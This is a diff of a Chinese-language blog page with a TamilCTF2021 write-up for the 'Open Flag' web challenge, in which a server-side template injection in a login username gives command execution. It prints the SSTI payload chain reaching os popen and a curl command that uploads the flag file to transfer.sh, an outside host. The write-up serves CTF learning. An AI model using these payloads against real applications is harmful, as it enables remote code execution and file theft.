@@ -60,7 +60,7 @@
 <meta property="og:site_name" content="温柔小猪">
 <meta property="og:description" content="Open Flag 访问题目中给出的链接,发现是一个登录页面随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是./flag.jpg.F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可 使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记&amp;lt;!--,找到os._wrap_close模块所在的索引为132,借">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-12-08T09:34:42.753Z">
+<meta property="og:updated_time" content="2021-12-08T09:44:34.753Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TamilCTF2021 Writeup">
 <meta name="twitter:description" content="Open Flag 访问题目中给出的链接,发现是一个登录页面随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是./flag.jpg.F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可 使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记&amp;lt;!--,找到os._wrap_close模块所在的索引为132,借">
@@ -326,7 +326,7 @@
 
       
         <h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
-<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="images/login.png" alt="Open Flag" style="zoom:80%;"><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;"></p>
+<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;"><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;"></p>
 <p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
 <pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()}}
 </code></pre>
@@ -335,7 +335,7 @@
 <pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()}}
 </code></pre>
 <p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
-<p><img data-src="images/flag.jpg" alt="Open Flag" style="zoom:80%;"></p>
+<p><img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;"></p>
 <p><strong>flag:</strong><code>TamilCTF{SsTi_Is_VeRy_DaNgErOuS}</code><br><a id="more"></a></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
